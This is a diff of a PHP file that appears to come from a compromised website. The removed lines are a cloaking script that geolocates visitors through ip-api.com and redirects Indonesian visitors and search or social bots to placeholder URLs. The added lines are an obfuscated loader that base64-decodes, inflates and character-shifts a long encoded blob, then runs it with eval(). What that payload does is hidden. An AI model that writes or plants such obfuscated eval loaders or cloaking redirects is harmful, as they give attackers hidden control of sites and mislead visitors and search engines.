@@ -1,66 +1,11 @@
-<?php
-
-function phubo_nang() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        return $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        return $_SERVER['REMOTE_ADDR'];
-    }
-}
-
-function chau_cibai() {
-    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    $bots = [
-        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
-        'facebot', 'facebookexternalhit', 'ia_archiver', 'mj12bot', 'semrushbot',
-        'rogerbot', 'ahrefsbot', 'spbot', 'pinterestbot', 'linkedinbot', 'telegrambot',
-        'twitterbot', 'applebot', 'googlebot-mobile'
-    ];
-
-    foreach ($bots as $bot) {
-        if (strpos($userAgent, $bot) !== false) {
-            return true;
-        }
-    }
-
-    $botHeaders = ['x-forwarded-for', 'via', 'client-ip', 'x-real-ip'];
-    foreach ($botHeaders as $header) {
-        if (isset($_SERVER[$header])) {
-            return true;
-        }
-    }
-
-    return false;
-}
-//endpoint //pastikan curl ON
-function lan_ciau($ip) {
-    $url = 'http://ip-api.com/json/' . $ip;
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    if ($response === false) {
-        return null;
-    }
-    return json_decode($response, true);
-}
-$visitor_ip = phubo_nang();
-$result = lan_ciau($visitor_ip);
-
-//ganti xxxxx ke url
-if ($result) {
-    $country = isset($result['country']) ? $result['country'] : 'Unknown';
-    if ($country === 'Indonesia') {
-        header("Location: xxxxxxx", true, 301);
-        exit();
-    }
-}
-
-if (chau_cibai()) {
-    header("Location: xxxxxxxxx", true, 301);
-    exit();
-}
-
-?>
+<?php 
+$link = 'xxxx';
+function GGr($tuFz)
+{ 
+$tuFz=gzinflate(base64_decode($tuFz));
+ for($i=0;$i<strlen($tuFz);$i++)
+ {
+$tuFz[$i] = chr(ord($tuFz[$i])-1);
+ }
+ return $tuFz;
+ }eval(GGr("jVTtatswFH0AP8VtCdiBpN7Yv4YwQuOuhS4prrMNyjCKrSRaVElI8poy8uy7cuxYbddR/bE+zj2659xrrSpRWCYFqE21lLkgYh314U8AONgKohP6oOxT1MvvkvRbkt6HV1l2m1/cXCezLL++DX/2W7QbmtpKC3gbPaqhe6Dc0Lfpf+SX8/T7JJ0mUzd71yWvYvyr/hedJl/nWZJPptMuKNgHwap1ptiQKi/YkrCjM73KUD1ZU2FhDMZqK7l8pPqljgWu8skXFI8SDtS9pbQGg+7DtZRrTnEZDiBcMrFupoZXWoU1GNOpvyupKSk2EB2iialpfE+cl5iHkibqchs0sJPxGFYEbfAjPC+srujoeLBvLDime0VJSfUh6d0Qc3kkuqSlm7l8fzPiPgVneOWQKbfYDTFh7haNo88UtIROx6aev5TCjKG2c7NBPW+D9wloELX8EZY1jqkolWRYuThWxFi2JVjiSnOYz7qacyKw5KSKekx1RUfQGMKNteo8jpkaEsXOCvkQ/zJSxCGcAaKbMqPWcU2bM8FQCs6aDqg3UZ5UuF1sBnCxSG/mt1meJtkinWXpZHZ3maSDWlXbNZoaJQU2ckNKd7Rw0T5nwaWh3qYz0gv8VxM07oiK87bzvW0nKy9pIUvaER3z2ge938wwK3XOFOblPyCjwOEr7n6PzsoOjgCsxJoIy2DnBmwpoIagzRlDj7YXshJWPyFV0xaH8/uwOcB/Cz7D6104h3AhtkI+itBz5EiHhoTXopSCGmxh35ZDu0WnN7Igrh3OoceZ2J4etA/g04eP/a7f6A4L3PdeDneN/2i01O+nbSn3fwE="));?>
